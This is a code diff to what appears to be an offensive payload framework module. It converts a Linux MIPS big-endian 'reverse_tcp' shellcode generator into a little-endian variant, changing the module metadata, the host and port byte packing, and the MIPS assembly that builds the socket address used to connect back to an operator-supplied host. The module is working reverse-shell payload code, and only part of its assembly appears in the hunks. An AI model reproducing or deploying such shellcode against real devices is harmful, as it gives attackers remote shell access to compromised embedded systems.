@@ -16,17 +16,17 @@ class PawnModule(Module, Socket, Assembler):
         super().__init__()
 
         self.details.update({
-            'Name': "linux/mipsbe/reverse_tcp",
+            'Name': "linux/mipsle/reverse_tcp",
             'Authors': [
                 'Ivan Nikolsky (enty8080) - payload developer'
             ],
-            'Architecture': "mipsbe",
+            'Architecture': "mipsle",
             'Platform': "linux",
         })
 
     def run(self, host: str, port: int, length: int = 4096, reliable: bool = True) -> bytes:
-        host = self.pack_host(host, 'big')
-        port = self.pack_port(port, 'big')
+        host = self.pack_host(host)
+        port = self.pack_port(port)
 
         payload = dedent(f"""\
             start:
@@ -62,11 +62,11 @@ class PawnModule(Module, Socket, Assembler):
                 lw $a0, -4($sp)
                 li $t7, -3
                 nor $t7, $t7, $zero
-                sw $t7, -32($sp)
-                lui $t6, 0x{port.hex()}
+                sw $t7, -30($sp)
+                ori $t6, $zero, 0x{port.hex()}
                 sw $t6, -28($sp)
-                lui $t6, {host[:2].hex()}
-                ori $t6, $t6, {host[2:].hex()}
+                lui $t6, 0x{host[:2].hex()}
+                ori $t6, $t6, 0x{host[2:].hex()}
                 sw $t6, -26($sp)
                 addiu $a1, $sp, -30
                 li $t4, -17
